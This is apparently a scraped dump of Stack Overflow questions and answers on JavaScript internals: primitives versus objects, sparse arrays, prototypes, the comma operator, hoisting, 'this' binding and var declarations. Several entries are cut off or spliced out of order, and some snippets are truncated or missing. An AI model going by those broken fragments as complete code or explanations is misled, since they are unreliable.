"<p>What is the quickest and cleanest way to test if a <code>var</code> holds immutable data (i.e. is <code>string</code>, <code>number</code>, <code>boolean</code>, <code>null</code>, <code>undefined</code>)?</p>

<p>E.g. When <code>var test</code> is mutable, the following is legal:</p>

<pre><code>var test = {}; 
//the next 2 lines work because `test` has mutable data
test.someFun = function () { alert(this); };
test.someFun(); 
</code></pre>

<p>but when <code>var test</code> is immutable, it's illegal:</p>

<pre><code>var test = ""string""; 
//the next 2 lines are invalid, as `test` is a primitive
test.someFun = function () { alert(this); };
test.someFun(); 
</code></pre>
","5445","","<p>Just another short option:</p>

<pre><code>function isPrimitive(value) {
  return Object(value) !== value;
}
</code></pre>

<p>How does it works:</p>

<p>If the <code>value</code> is a primitive value that is <em>convertible to object</em>, such as a <code>Number</code>, <code>String</code> or a <code>Boolean</code>, the strict equality operator will return true, since the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.2.1"" rel=""nofollow""><code>Object</code> constructor called as a function</a>, will convert the value to a ""wrapped object"":</p>

<pre><code>typeof 5;         // ""number""
typeof Object(5); // ""object"", a wrapped primitive
5 === Object(5);  // false
</code></pre>

<p>If the value is a primitive not convertible to Object, such as <code>null</code> or <code>undefined</code>, the Object constructor will create a new empty object, returning true.</p>

<p>The last case, if <code>value</code> holds a reference to an object, the <code>Object</code> constructor will do nothing, and the strict equality operator will return <code>false</code>.</p>

"<p>In Javascript, if I do something like</p>

<pre><code>var alpha = [];
alpha[1000000] = 2;
</code></pre>

<p>does this waste memory somehow?  I remember reading something about Javascript arrays still setting values for unspecified indices (maybe sets them to undefined?), but I think this may have had something to do with delete.  I can't really remember.</p>
","5445","","<p>This is an old myth, the other indexes on the array will not be assigned.</p>

<p>When you assign a property name that is an ""array index"" (e.g. <code>alpha[10] = 'foo'</code>, a name that represents an unsigned 32-bit integer) and it is greater than the current value of the <code>length</code> property of an <code>Array</code> object, two things will happen:</p>

<ol>
<li>The ""index named"" property will be created on the object.</li>
<li>The <code>length</code> will be incremented to be that <code>index + 1</code>.</li>
</ol>

<p>Proof of concept:</p>

<pre><code>var alpha = [];
alpha[10] = 2;
alpha.hasOwnProperty(0);  // false, the property doesn't exist
alpha.hasOwnProperty(9);  // false
alpha.hasOwnProperty(10); // true, the property exist
alpha.length;             // 11
</code></pre>

<p>As you can see, the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/HasOwnProperty""><code>hasOwnProperty</code></a> method returns <code>false</code> when we test the <em>presence</em> of the <code>0</code> or <code>9</code> properties, because they don't exist physically on the object, whereas it returns <code>true</code> for <code>10</code>, the property was created.</p>

<p>This misconception probably comes from popular JS consoles, like Firebug, because when they detect that the object being <em>printed</em> is an <em>array-like</em> one, they will simply make a loop, showing each of the index values from <code>0</code> to <code>length - 1</code>.</p>

<p>For example, <em>Firebug</em> detects array-like objects simply by looking if they have a <code>length</code> property whose its value is an unsigned 32-bit integer (less than 2^32 - 1), and if they have a <code>splice</code> property that is a function:</p>

<pre><code>console.log({length:3, splice:function(){}});
// Firebug will log: `[undefined, undefined, undefined]`
</code></pre>

<p>In the above case, Firebug will internally make a sequential loop, to show each of the property values, but no one of the indexes really exist and showing <code>[undefined, undefined, undefined]</code> will give you the false sensation that those properties exist, or that they were ""allocated"", but that's not the case...</p>

<p>This has been like that since ever, it's specified even of the <a href=""http://www.mozilla.org/js/language/E262.pdf"">ECMAScript 1st Edition Specification</a> (as of 1997), you shouldn't worry to have implementation differences.</p>

","5445","","<p>I think you meant in the last line <code>aa.hi</code> instead of <code>aa.hello</code>.</p>

<p>It gives you <code>undefined</code> because the <code>A.prototype</code> is assigned <strong>after</strong> the new object (<code>aa</code>) has been already created.</p>

<p>In your second line:</p>

<pre><code>//...
aa = new A;
//...
</code></pre>

<p>This will create an object that inherits from <code>A.prototype</code>, at this moment, <code>A.prototype</code> is a simple empty object, that inherits from <code>Object.prototype</code>.</p>

<p>This object will remain referenced by the internal <code>[[Prototype]]</code> property of the <code>aa</code> object instance.</p>

","5445","","<blockquote>
  <p>Why are window and document being fed in instead of just being accessed normally?</p>
</blockquote>

<p>Generally to fasten the identifier resolution process, having them as local variables can help (although IMO the performance improvements may be negligible).</p>

<p>Passing the global object is also a widely used technique on non-browser environments, where you don't have a <code>window</code> identifier at the global scope, e.g.:</p>

<pre><code>(function (global) {
  //..
})(this); // this on the global execution context is 
          // the global object itself
</code></pre>

<blockquote>
  <p>Why the heck is undefined being passed in?</p>
</blockquote>

<p>This is made because the <code>undefined</code> global property in ECMAScript 3, is mutable, meaning that someone could change its value affecting your code, for example:</p>

<pre><code>undefined = true; // mutable
(function (undefined) {
  alert(typeof undefined); // ""undefined"", the local identifier
})(); // &lt;-- no value passed, undefined by default
</code></pre>

<p>If you look carefully <code>undefined</code> is actually not being passed (there's no argument on the function call), that's one of the reliable ways to get the <code>undefined</code> value, without using the property <code>window.undefined</code>.</p>

<p>The name <code>undefined</code> in JavaScript doesn't mean anything special, is not a keyword like <code>true</code>, <code>false</code>, etc..., it's just an identifier.</p>

<p>Just for the record, in ECMAScript 5, this property was made non-writable...</p>

"<p>Here are two reasons to think strings are objects. First, you can create a string in the following way:</p>

<pre><code>var mystring = new String(""asdf"");
</code></pre>

<p>I'm under the impression that the constructor function following the new operator has to return an object. Second, strings seem to have properties and methods. For example:</p>

<pre><code>mystring.toUpperCase();
</code></pre>

<p>BUT, if strings were objects, then we'd expect something like the following to work:</p>

<pre><code>function string_constructor() {
return ""asdf"";
}

var mystring = new string_constructor();
</code></pre>

<p>But it doesn't, and I've been told it doesn't because strings aren't objects. So are strings objects or not? And, either way, how can I make sense of everything I've listed?</p>
","5445","","<p>Speaking about language types, <strong>Strings are <a href=""http://es5.github.com/#x4.3.2"">values</a></strong> of the String type.</p>

<p>The language has five <a href=""http://es5.github.com/#x8""><strong>primitive types</strong></a>, which are <em>String</em>, <em>Number</em>, <em>Boolean</em>, <em>Null</em> and <em>Undefined</em>.</p>

<p>There are String objects (also for Number or Boolean), they are called <em>primitive wrappers</em>, they are created when you use the constructor function associated with them, for example:</p>

<pre><code>typeof new String('foo'); // ""object""
typeof 'foo';             // ""string""
</code></pre>

<p>But don't get confused with them, you will <em>rarely need</em> to use primitive wrappers, because even if primitive values are not objects, you can still access their inherited properties, for example, on a string, you can access all members of <code>String.prototype</code>, e.g.:</p>

<pre><code>'foo'.indexOf('o'); // 2
</code></pre>

<p>That's because the property accessor (the dot in this case) temporarily converts the primitive value to an object, for being able to resolve the <code>indexOf</code> property up in the prototype chain.</p>

<p>About the constructor function you have in your question, as you know, it won't return the string.</p>

<p>Functions called with the <code>new</code> operator return an implicit value, which is a new object that inherits from that function's <code>prototype</code>, for example:</p>

<pre><code>function Test () {
  // don't return anything (equivalent to returning undefined)
}

new Test() instanceof Test; // true, an object
</code></pre>

<p>If an <strong>object</strong> is returned from the constructor, that newly created object (this within the constructor) will be lost, so the explicit returned object will come out the function:</p>

<pre><code>function Test2() {
  return {foo: 'bar'};
}

new Test2().foo; // 'bar'
</code></pre>

<p>But in the case of <em>primitive values</em>, they are <em>just ignored</em>, and the new object from the constructor is implicitly returned (for more details check the <a href=""http://es5.github.com/#x13.2.2""><code>[[Construct]]</code></a> internal operation, (see step 9 and 10)).</p>
"
"<p>There are things like</p>

<pre><code>f.call(...)
f.apply(...)
</code></pre>

<p>But then there's this</p>

<pre><code>(1, alert)('Zomg what is this????!!!11')
</code></pre>

<p>""1"" does not seem to mean much in this context, the following works just fine:</p>

<pre><code>(null, alert)('Zomg what is this????!!!11')
(1, null, alert)('Zomg what is this????!!!11')
(undefined, alert)('Zomg what is this????!!!11')
</code></pre>

<p>Could you point to a specific part of ECMAScript which describes that syntax?</p>
","5445","","<p>You are just using <a href=""http://es5.github.com/#x11.14"">The Comma Operator</a>.</p>

<p>This operator only evaluates its operands from left to right, and returns the value from the second one, for example:</p>

<pre><code>(0, 1); // 1
('foo', 'bar'); // 'bar'
</code></pre>

<p>In the context of calling a function, the evaluation of the operand will simply get a value, not a reference, this causes that the <code>this</code> value inside the invoked function point to the global object (or it will be <code>undefined</code> in the new ECMAScript 5 Strict Mode).</p>

<p>For example:</p>

<pre><code>var foo = 'global.foo';

var obj = {
  foo: 'obj.foo',
  method: function () {
    return this.foo;
  }
};

obj.method();      // ""obj.foo""
(1, obj.method)(); // ""global.foo""
</code></pre>

<p>As you can see, the first call, which is a direct call, the <code>this</code> value inside the <code>method</code> will properly refer to <code>obj</code> (returning <code>""obj.foo""</code>), the second call, the evaluation made by the comma operator will make the <code>this</code> value to point to the global object (yielding <code>""global.foo""</code>).</p>

<p>That pattern has been getting quite popular these days, to make indirect <a href=""http://es5.github.com/#x15.1.2.1.1"">calls to <code>eval</code></a>, this can be useful under ES5 strict mode, to get a reference to the global object, for example, (imagine you are in a non-browser environment, <code>window</code> is not available):</p>

<pre><code>(function () {
  ""use strict"";
  var global = (function () { return this || (1,eval)(""this""); })();
})();
</code></pre>

<p>In the above code, the inner anonymous function will execute within a strict mode code unit, that will result on having the <code>this</code> value as <code>undefined</code>.</p>

<p>The <code>||</code> operator will now take the second operand, the <code>eval</code> call, which is an indirect call, and it will evaluate the code on the global lexical and variable environment.</p>

<p>But personally, in this case, under strict mode I prefer using the <code>Function</code> constructor to get the global object:</p>

<pre><code>(function () {
  ""use strict"";
  var global = Function('return this')();
})();
</code></pre>

<p>Functions that are created with the <code>Function</code> constructor are strict only if they start with a Use Strict Directive, they don't ""inherit"" the strictness of the current context as Function Declarations or Function Expressions do.</p>

<p>Does this mean Chrome has a different interpretation of this function? How can one prevent extensions to an object's prototype (in Chrome)?</p>
","5445","","<p>In ECMAScript 5, objects have a boolean <a href=""http://es5.github.com/#x8.6.2"" rel=""nofollow"">internal property</a> named <code>[[Extensible]]</code>, this property is set to <code>false</code> when you call the <a href=""http://es5.github.com/#x15.2.3.10"" rel=""nofollow""><code>Object.preventExtensions</code></a> method, and after that, no new <strong>own properties</strong> can be added to the object.</p>

<p>On Chrome 14.0.786.0, the assignment to <code>__proto__</code> throws a <code>TypeError</code> as you expect.</p>

<p>But remember that the <code>__proto__</code> extension is <strong>non-standard</strong>, so it's behavior may vary, of course syntactically it is a ""property assignment"", but internally it doesn't ""add an own property"", it mutates the object's prototype, thing that is not possible to do by any standard method.</p>

<p>There are more things like this if you look carefully, for example, the line:</p>

<pre><code>var len = t.length &gt;&gt;&gt; 0;
</code></pre>

<p>They are emulating a call to the <a href=""http://es5.github.com/#x9.6"" rel=""nofollow"">ToUint32</a> internal method, as described in the step 3, using the unsigned right shift operator (<a href=""http://es5.github.com/#x11.7.3"" rel=""nofollow""><code>&gt;&gt;&gt;</code></a>). </p>

<p><strong>Edit:</strong>
The previous lines answer <em>why</em> the Mozilla implementation does it in this way.</p>

<p>You might wonder why the ECMAScript spec. needs to call <code>ToObject</code>, check back the <em>Step 2</em>, and it will start to seem obvious:</p>

<blockquote>
  <ol>
  <li>Let lenValue be the result of calling the [[Get]] internal method of O with the argument ""length"".</li>
  </ol>
</blockquote>

<p>The spec. needs to ensure that the <code>this</code> value used when the function is called is <em>an object</em>, because primitive values don't have any internal methods, an as you can see on the step 2, the <code>[[Get]](P)</code> internal method is needed, to get the value of the <code>length</code> property.</p>

<p>This is done because for <em>strict functions</em> (and also for built-in functions), you can set <em>primitive values</em> as the function's <code>this</code> value, e.g.:</p>

<pre><code>(function () {""use strict""; return typeof this; }).call(5); // ""number""
</code></pre>

<p>While for non-strict functions, the <code>this</code> value is always converted to Object:</p>

<pre><code>(function () { return typeof this; }).call(5); // ""object""

<li>Sets the internal <code>[[Prototype]]</code> of this object, pointing to the Function <code>prototype</code> property.

","5445","","<blockquote>
  <p>Why use Array.prototype and not just Array.slice.call(arguments)?</p>
</blockquote>

<p>The <code>Array.slice</code> method is part of the <a href=""https://developer.mozilla.org/en/New_in_JavaScript_1.6#Array_and_String_generics"" rel=""nofollow""><strong>Array and String Generics</strong></a>, a set of <em>""static""</em> methods implemented as properties of the <code>Array</code> and <code>String</code> constructors.</p>

<p>Those methods are <strong>non-standard</strong>, they are available just in Mozilla-based implementations.</p>

<p>I've seen a lot confusion between those methods and the standard ones, but you should know that they aren't the same, if you test:</p>

<pre><code>Array.slice === Array.prototype.slice; // false
</code></pre>

<p>You will find that they are different methods.</p>

<p>And by the way, if you where using that method, you don't need to use the <code>call</code> method, the first argument is the object that will be used as the <code>this</code> value (<code>Array.slice(arguments)</code>).</p>

<blockquote>
  <p>Is using the prototype significant here?</p>
</blockquote>

<p>Yes, the <code>Array</code> constructor is just a function, the standard <code>slice</code> method, and all the other ""array methods"" are defined on <code>Array.prototype</code>.</p>

<p>This object, <code>Array.prototype</code>, is the one in which all Array object instances inherit from.</p>

<p>As <a href=""http://stackoverflow.com/questions/6763555/why-use-prototype-in-this-array-slice-call/6763674#6763674"">@Pointy</a> says, you could get a reference to the method using an Array instance:</p>

<pre><code> [].slice === Array.prototype.slice; // true
</code></pre>

<p>This, in theory, will create a new Array object, and access the <code>slice</code> method up in the prototype chain, but I remember that some implementations are starting to optimize this kind of property access, avoiding the creation of the <em>disposable</em> object, so, at some point, it will be exactly the same also talking in terms of performance. </p>

"<p>Sorry, that title probably doesn't make much sense, but what I want to know is the difference between:</p>

","5445","","<p>In the global scope, there are some subtle differences:</p>

<p>Function declarations are ""hoisted"" to the ""top"" of its enclosing scope, they are evaluated and initialized before the actual execution of the code starts, meaning that if you wanted, you could even use them in a point before the function definition, for example:</p>

<pre><code>console.log(typeof foo); // ""function""
console.log(foo());      // ""bar""

function foo () {
  return ""bar"";
}
</code></pre>

<p><sub>Note: If you try the above snippet in Firebug, it will show a different behavior, that's because the Mozilla implementations support functions as statements, and the Firebug evaluation is done internally, inside a <code>try-catch</code> block, enclose the above code in a function and it will show the described behavior.</sub></p>

<p>Assignments take place at run-time, therefore the value of <code>foo</code> would be available only after this takes place.</p>

<p>Function declarations also are bound as non-deletable properties of the lexical enviroment where they are bound, in the global scope, declarations are bound as properties of the global object, which is the top-most object at the scope chain, for example:</p>

<pre><code>function foo() {
  //..
}

console.log(delete window.foo); // false
console.log(typeof foo);        // ""function""

window.bar = function() {
  //..

"<p>So when I make a library, I usually do it in this fashion:</p>

<pre><code>var myLib = (function() {

        anotherMethod: function() { //... },
        // .. many more public methods
    };
}());

<p>I had overheard that creating libraries is faster and/or uses less memory for initialization if you write it like this:</p>

<pre><code>var MyLib = function() {
   this.publicProperty = 'test';
};

MyLib.prototype = {
    publicMethod: function() {
        console.log('public method');
    },
    anotherMethod: function() { //... },
    // ... many more public methods
};

myLib = new MyLib();
</code></pre>

<p>Does one initialize faster than the other? Does my question even make sense? I assume that these accomplish the same task (that task being I go and use <code>myLib.publicMethod()</code> somewhere else in my code on docready). Thanks!</p>
","5445","","<p><strong>Edit:</strong> Looking at the changes on the question, I ask you:</p>

<ul>
<li>Do you plan to have multiple ""instances"" of your library simultaneously?</li>
</ul>

<p>If you don't, I don't see any benefit of using a constructor, you will have only one object, there's no point to define the properties on its prototype -they will be defined and used on a single object anyway-. </p>

<p>Using inheritance will be useful in the case you want to have multiple object instances, the methods will be shared, -reused and declared only once- higher in the prototype chain.</p>

<hr>

<p>There are several issues in your second example:</p>

<pre><code>var myLib = (function() {
   this.publicProperty = 'this';
}());
</code></pre>

<p>The <code>myLib</code> variable will contain just <code>undefined</code> -you are not returning anything from the function expression-, and your <code>publicProperty</code> will be defined as a property of the global object, since in the way you are executing this function, <code>this</code> will be bound to the global object.</p>

<p>Also, if the code is executed within <a href=""https://developer.mozilla.org/en/JavaScript/Strict_mode"" rel=""nofollow"">strict mode</a>, the <code>this</code> value in that case will be <code>undefined</code>, and your property access expression will just throw a <code>TypeError</code> -a good thing IMO, since I'm pretty sure you don't want to declare <code>publicProperty</code> as a member of the global object-.</p>

<pre><code>myLib.prototype = {
    publicMethod: function() {
        console.log('public method');
    },
    anotherMethod: function() { //... },
    // ... many more public methods
};
</code></pre>

<p>Accessing the <code>prototype</code> property here will fail -remember, <code>myLib</code> is <code>undefined</code>-.</p>

<p>The <code>prototype</code> is only meaningful for <em>functions</em>, used on <em>constructor functions</em> -functions that are intended to be used with the <code>new</code> operator-, I think you are confusing that property with the internal <code>[[Prototype]]</code> property that all objects have.</p>

<p>Defining a property named <code>prototype</code> on a non-function object, will have no effect.</p>

"<p>My motivation for the augmentation of Object is I want to be able to easily handle objects meant to simply store data (like a ""hashmap"" in Java). I want to easily do hashmap.size().</p>

<p>Let's say my object has a property called objData which was empty when made like this:</p>

<pre><code>var objData = {};
</code></pre>

<p>My object has some methods that can add data to objData like this:</p>

<pre><code>this.objData[key1name] = data1;
</code></pre>

<p>And my object also has some methods which access objData:</p>

<pre><code>if(this.objData.size() == 0):
</code></pre>

<p>Of course, no such method exists. So that's my motivation for augmenting the Object object:</p>

<pre><code>        Object.prototype.getOwnPropertyCount = function ( ) {
            var count = 0;
            for(var item in this) {
                if (this.hasOwnProperty(item)) {
                    count += 1;
                }
            }
            return count;
        };

<pre><code>if (this.objData.getOwnPropertyCount() == 0)

<p>or:</p>

<p>But in actuality I get errors when I try to load the page completely unrelated to any code I've written. I'm getting errors thrown in google maps api's main.js. Voodoo.</p>

<p>So I change my augmentation to augment the actual Object instead of Object.prototype:</p>

<pre><code>Object.getOwnPropertyCount = function ( ) {
    //calculate the count
    return count;

","5445","","<p>When you move your method declaration from <code>Object.prototype</code> directly to the <code>Object</code> constructor, the method is no longer available in the prototype chain of all objects (a good thing BTW), I would suggest you to provide your function an argument, to pass the object you need to opearate, and change your method call:</p>

<pre><code>// from `this.objData.getOwnPropertyCount()` to:
Object.getOwnPropertyCount(this.objData);
</code></pre>

<p>And obviously, in your implementation, you should count the properties of the passed object, since <code>this</code>, will refer to the <code>Object</code> constuctor, in the above example.</p>

<p>I understand that I should always use 'var' to define a local variable in a function.</p>

<p>When I define a global function, what's the difference between using 'var' ?</p>

<p>Some of code examples I see over the internet use</p>

<pre><code>var globalVar = something;
globalVar = something;
</code></pre>

<p>What's the difference?</p>
","5445","","<p>Well, the difference is that <em>technically</em>, a simple assignment as <code>globalVar = 'something';</code> doesn't <strong>declare a variable</strong>, that assignment will just <strong>create a property</strong> on the global object, and the fact that the global object is the last object in the scope chain, makes it resolvable.</p>

<p>Another difference is the way the binding is made, the variables are bound as ""non-deletable"" properties of its environment record, for example:</p>

<pre><code>var global1 = 'foo';
delete this.global1; // false

global2 = 'bar';
delete this.global2; // true
</code></pre>

<p>I would strongly encourage you to always use the <code>var</code> statement, your code for example will break under ECMAScript 5 Strict Mode, assignments to undeclared identifiers are disallowed to avoid <em>implicit globals</em>.</p>

"<p>I just got Javascript: The Good Parts by Douglas Crockford and I'm having some difficulty understanding one of his examples regarding prototypes. The code in the book reads as follows:</p>

<pre><code>if (typeof Object.create !== ""function"") {
    Object.create = function(o) {
        var F = function () {}
        F.prototype = o;
        return new F;
    };
}
</code></pre>

<p>I'm assuming that this code is used to target a function's prototype. But why use such a complex approach? Why not just use <code>variable</code>.prototype? Crockford is the leading expert on Javascript so I'm sure there is a good reason for using this model. Can anyone help me understand it better? Any help would be appreciated.</p>
","5445","","<p>In ECMAScript 3, the <code>new</code> operator was the only standard way to set the <code>[[Prototype]]</code> <em>internal property</em> of an object, in this case, Crockford is just using a <em>temporary constructor function</em> <code>F</code> for that purpose.</p>

<p>The <code>o</code> argument of that method, is set as the <code>prototype</code> property of the temporary constructor, and by invoking <code>new F();</code> it builds a new empty object that inherits from <code>F.prototype</code> (see <a href=""http://stackoverflow.com/questions/6750880/javascript-how-does-new-work-internally"">this question</a> for more details about how <code>new</code> works).</p>

<p>For example:</p>

<pre><code>var a = { a: 1 };
var b = Object.create(a); // b inherits from a
b.a; // 1
</code></pre>

<p>In the above example, we can say that the <code>b</code>'s internal <code>[[Prototype]]</code> property points to <code>a</code>.</p>

<pre><code>Object.getPrototypeOf(b) === a; // true
</code></pre>

<p>In other words, <code>b</code> inherits from <code>a</code>.</p>

<p>With the same example, we could use an empty constructor, e.g.:</p>

<pre><code> function F(){}
 F.prototype = a;

 var b = new F(); // b again inherits from a (F.prototype)
</code></pre>

<p>Remember also that the <code>prototype</code> property of functions is different than the <code>[[Prototype]]</code> property that all objects have, the <code>prototype</code> property of functions is used when they are called with the new operator, to build a new object that inherits from that property.</p>

<p>Also, be aware that now, the ECMAScript 5 Standard is being implemented, and this shim, doesn't conform 100% with the spec, in fact, there are some features of the standard <code>Object.create</code> method <a href=""http://stackoverflow.com/questions/3830800/object-defineproperty-in-es5/3844768#3844768"">that cannot be emulated on ES3</a>. </p>

</code></pre>

<p>Throws 'TypeError: can't convert undefined to object'</p>

<p>How else could I assign the test function to a variable, for passing in functions, later evaluation, etc.? (Without wrapping the regex in another function)</p>

<p>Update:</p>

<p>Consider this bit of valid code before answering:</p>

<pre><code>var o = { f: function() { return 1 } };
var a = o.f;
var b = a();     // b = 1
</code></pre>
","5445","","<p>It has to do with the value of <code>this</code> inside the <code>test</code> method.</p>

<p>For example:</p>

<pre><code>var obj = {
  method: function () { return this === obj }
};

obj.method(); // true

var method = obj.method;
method(); // false
</code></pre>

<p>If you call the <code>test</code> method ""as a function"" -as your example <code>r();</code>-, the <code>this</code> value will refer to <code>undefined</code> (for built-in or strict functions in ECMAScript 5, in the above example <code>this</code> will refer to the global object).</p>

<p>Calling any method of <code>RegExp.prototype</code> with a <code>this</code> value that is not a <code>RegExp</code> object, will always generate this <code>TypeError</code> exception, quoting the spec:</p>

</blockquote>

<p>However you could bind the <code>test</code> method to your <code>r</code> function, using the <code>Function.prototype.bind</code> method:</p>

<pre><code>var re = /^[0-9A-Z]$/,
    r = re.test.bind(re);

r(""A""); // true

<p>only affects bar.one..</p>

<p>My first intuition is that since in the first piece of code we are assigning a foo reference to bar, then it means the change will also apply to foo, while on the second code, it probably 'inherits' from foo, and therefore the change on bar's 'subclass' attribute won;t apply to its 'superclass' (prototype)..</p>

<p>Can somebody please confirm that my assumption is at least on the right track? Would absolutely appreciate any answers. Thanks in advance.</p>
","5445","","<p>The line:</p>

<pre><code>var bar = new Object( foo );
</code></pre>

<p>In your first snippet, it doesn't do anything -you are right with your assumption-, it will simply return a reference to the same object passed to the <code>Object</code> constructor.</p>

<p>That's the behavior when you pass a <em>native object</em> to the <code>Object</code> constructor in a <code>new</code> expression (<a href=""http://es5.github.com/#x15.2.2.1"" rel=""nofollow""><code>new Object(value)</code></a>), if you pass a <a href=""http://webcache.googleusercontent.com/search?q=cache:7jGjZFWhwsgJ%3awww.jibbering.com/faq/#hostObject"" rel=""nofollow""><em>host object</em></a>, the results are implementation dependent.</p>

<p>If you don't pass a value (or you explicitly pass the primitives <code>undefined</code> or <code>null</code>) a new object that inherits from <code>Object.prototype</code> will be created.</p>

<p>Otherwise, if you pass any of the remaining primitives (as a Number, String or a Boolean value), a <em>primitive wrapper object</em> will be created (basically ""primitive-to-object"" type conversion), for example.</p>

<pre><code>var s = new String(""foo""); // a string object wrapper
typeof s;     // ""object""
s.valueOf();  // ""foo""
</code></pre>

<p><sup> See this question about primitives and objects: <a href=""http://stackoverflow.com/questions/3907613/how-is-a-javascript-string-not-an-object"">How is a Javascript string not an object?</a></sup></p>

<p>In your second snippet, the line:</p>

<pre><code>var bar = Object.create( foo );
</code></pre>

<p>Creates a new object, that inherits from <code>foo</code>, and since it's a different object, when you assign the properties:</p>

<pre><code>bar.three = 3;
bar.one = 100;
</code></pre>

<p>Those will be created physically on that separated <em>instance</em>, as you can see, the <code>bar.one</code> property <strong>shadows</strong> the value contained in <code>foo</code>.</p>

<p>The object referenced by <code>bar</code>, in fact will contain two <strong>own properties</strong> (<code>one</code> and <code>three</code>, but since it inherits from <code>foo</code>, the property named <code>two</code> is resolvable through the prototype chain, for example:</p>

<pre><code>bar.hasOwnProperty('one'); // true, the property is ""own""
bar.hasOwnProperty('two'); // false, the property is ""inherited"" from foo
bar.two; // 2, is accessible
</code></pre>

<p>Basically, the prototype chain of <code>bar</code> looks like this:</p>

<pre>
                                                      -----------------
                                           ========> | Object.prototype| ==> null
                                           |          -----------------
|-------------|     [[Prototype]]     |---------|
| one:   100  | ====================> |  one: 1 | (shadowed)
| three: 3    |                       |  two: 2 |
|-------------|                       |---------|

"<p>I do know that in javascript, when you use <code>""this""</code> keyword inside a function, then <code>""this""</code> would refer to the 'owner' of that function according to <a href=""http://www.quirksmode.org/js/this.html"" rel=""nofollow"">Quirksmode website</a>. Therefore when we have a function and we use <code>""this""</code> inside it, then <code>""this""</code> refers to the global (window) object. </p>

<p>I am a little confused on how <code>""this""</code> works, for example in the code below, <code>""this""</code> then should be able to resolve <code>x</code> since <code>x</code> is pretty much a property of global object (in this case window). But <code>this.x</code> in this case alerts <code>""undefined""</code> instead of the <code>x</code> value.</p>

<pre><code>var x = ""Global"";

function foo(){
    alert(this.x);   //undefined     
};
foo();

    function foo(){
        alert(this); //[Object DOMWindow]
    };
    foo();
};

bar();
</code></pre>

<p>If my understanding is correct, then <code>'this'</code> should refer to <code>bar()</code> in that second case since it is the owner of <code>foo()</code>, but why is that it instead still refers to the global object?</p>

","5445","","<p>Summarizing your question, you ask why in your first snippet, <code>this.x</code> is <code>undefined</code>:</p>

function foo(){

}
foo();
</code></pre>

<p>It doesn't make sense at all, the <code>this</code> value should refer to the global object -if your code were on strict mode, you would get a <code>TypeError</code>, since <code>this</code> by itself would be <code>undefined</code>-.</p>

<p>The only way I think where <code>this.x</code> could be <code>undefined</code>, is in the case that the variable declaration of <code>x</code> was made within a function.</p>

<p>Check the two following examples: <a href=""http://jsfiddle.net/KVbHr/"" rel=""nofollow"">1</a> and <a href=""http://jsfiddle.net/KVbHr/1"" rel=""nofollow"">2</a>, it's exactly the same code, the difference is that the second one, the code is wrapped in an <code>onload</code> event handler, so the <code>x</code> variable doesn't exist in the global scope (<code>window.x</code> is <code>undefined</code>)...</p>

<p>can anyone please explain me ?</p>
","5445","","<p>The first <code>alert</code> shows <code>undefined</code> because the <code>var</code> statements are <em>hoisted</em> to the top of the enclosing scope, in other words, <code>var</code> statements and <code>function</code> declarations are made before the actual code is executed, in the parsing stage.</p>

<p>When your code is executed, is equivalent to:</p>

<pre><code>var a;    // declared and initialized with `undefined` before the code executes
alert(a); // undefined
alert(b); // ReferenceError, b is not declared.
a=1;
b=10;
</code></pre>

<p>The second <code>alert</code> doesn't even executes, trying to access <code>b</code> gives you a <code>ReferenceError</code> because you never declared it, and you are trying to access it.</p>

<p>That's how the identifier resolution process works in Javascript, if an identifier is not found in all the scope chain, a <code>ReferenceError</code> exception is thrown.</p>

<p>Also, you should know that assigning an identifier <em>without declaring it first</em> (as <code>b = 10</code>) does not technically declares a <em>variable</em>, even in the global scope, the effect may be similar (and it seems to work), at the end the identifier ends as a property of the global object, for example:</p>

<pre><code>var a = 1;
b = 10;

// Similar effect:
window.a; // 1
window.b; // 10
</code></pre>

<p>But this is just due the fact that the global object is the top-most environment record of the scope chain.</p>

<p>Another difference between the two above is that the identifier declared with <code>var</code> produces a non-configurable property on the global object (cannot be deleted), e.g.:</p>

<pre><code>delete window.a; // false
delete window.b; // true
</code></pre>

<p>Also, if you are in the scope of a function, and you make an assignment to an undeclared identifier, it will end up being a property of the global object, just like in the above example, whereas the <code>var</code> statement will create a <em>local variable</em>, for example:</p>

<pre><code>(function(){
  var a = 1;
  b = 10;
})();

typeof window.a; // 'undefined', was locally scoped in the above function
typeof window.b; // 'number', leaked, an unintentional global
</code></pre>

<p>I would really discourage make assignments to undeclared identifiers, always use <code>var</code> to <em>declare</em> your variables, moreover, this has been <em>disallowed</em> on ECMAScript 5 Strict Mode, assignments made to undeclared identifiers throw a <code>ReferenceError</code>:</p>

<pre><code>(function(){'use strict'; b = 10;})(); // throws a ReferenceError

<p>Host objects are those that are provided by the environment, they are not part of the ECMAScript specification, for example DOM objects.</p>

"<p>The code in question is simple:</p>

<pre><code>console.log(""So it begins."");
foo();
function foo() { console.log(""In foo().""); }
console.log(""So it ends."");
</code></pre>

<p>Why does <code>foo()</code> execute, before it is defined (retrospective edit: in Chrome and Safari)?</p>

<p>I tinkered with this a bit, testing the following code in Chrome, Safari and Firefox: </p>

<pre><code>javascript:foo();function foo() { alert(""Oh.""); }
</code></pre>

<p>An alert is displayed in Chrome and Safari, while Firefox remains silent.</p>

<p>Is there any explanation for this surprising, inconsistent behavior?</p>
","5445","","<p>While others explained the ""hoisting"" behavior of functions (I personally find calling it <em>context preparation</em> or <em>pre-processing</em> more clear than <em>hoisting</em>) the reason of the different behavior of Firefox remains unanswered.</p>

<p>To start with, you should know the difference between a Function Declaration and a <em>Function Statement</em>.</p>

<p>A Function Declaration, as in your example can happen only in two places, in global code (outside of any function) and directly within the Function Body of another function, for example:</p>

<pre><code>function foo () {}

function bar () {
  function baz() {}
}
</code></pre>

<p>All the above functions are valid Function Declarations.</p>

<p>The ECMAScript Specification doesn't allow to define Function Declarations in other places for example within Blocks:</p>

<pre><code>if (true) {
  function foo () {}
}
</code></pre>

<p>The above function <em>should</em> give you a <code>SyntaxError</code> exception, but most implementations are benevolent, and they will still pre-process (hoist) the function, even if the actual function is not reachable (e.g. <code>if (false) { function bar() {} }</code>).</p>

<p>In Firefox, <em>Function Statements</em> are allowed, meaning that the function definition actually happens when the control reaches that specific statement, for example:</p>

<pre><code>if (true) {
  function foo () { return true; }
} else {
  function foo () { return false; }
}
</code></pre>

<p>Executing <code>foo();</code> after the above statements, in Firefox will produce <code>true</code>, because the first branch of the <code>if</code> statement is actually executed.</p>

<p>In other browsers, <code>foo();</code> produces <code>false</code> because all the functions are pre-processed when entering the execution context, and the last one will take precedence, even if the <code>false</code> branch of the <code>if</code> statement is <em>never</em> reached.</p>

